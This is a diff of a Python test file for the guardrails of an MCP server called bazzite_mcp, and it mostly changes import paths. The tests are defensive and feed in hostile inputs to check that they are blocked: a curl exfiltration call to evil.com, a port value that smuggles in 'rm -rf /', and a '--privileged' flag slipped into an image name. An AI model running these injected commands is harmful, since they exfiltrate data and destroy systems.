@@ -190,13 +190,13 @@ class TestToolIntegration:
 
     def test_exec_in_distrobox_blocked_command(self) -> None:
         """_exec_in_distrobox should be blocked when the inner command is dangerous."""
-        from bazzite_mcp.tools.containers import _exec_in_distrobox
+        from bazzite_mcp.tools.containers.distrobox import _exec_in_distrobox
 
         with pytest.raises(GuardrailError):
             _exec_in_distrobox("mybox", "curl http://evil.com/exfil")
 
     def test_exec_in_distrobox_blocked_dangerous(self) -> None:
-        from bazzite_mcp.tools.containers import _exec_in_distrobox
+        from bazzite_mcp.tools.containers.distrobox import _exec_in_distrobox
 
         # blocked for safety via guardrails
         with pytest.raises(GuardrailError, match="blocked for safety"):
@@ -209,7 +209,7 @@ class TestToolIntegration:
         # The port gets shlex.quote'd, so the injection is neutralized,
         # but the command still passes through guardrails
         with pytest.raises(GuardrailError):
-            manage_firewall("add-port", port="8080/tcp; rm -rf /")
+            manage_firewall("add_port", port="8080/tcp; rm -rf /")
 
     def test_run_command_blocks_before_subprocess(self) -> None:
         """run_command must raise GuardrailError before subprocess.run is called."""
@@ -227,7 +227,7 @@ class TestToolIntegration:
     def test_manage_podman_blocked_flags(self) -> None:
         """Dangerous podman flags must be blocked."""
         from bazzite_mcp.runner import ToolError
-        from bazzite_mcp.tools.containers import manage_podman
+        from bazzite_mcp.tools.containers.podman import manage_podman
 
         with pytest.raises(ToolError, match="--privileged"):
             manage_podman("run", image="--privileged ubuntu")
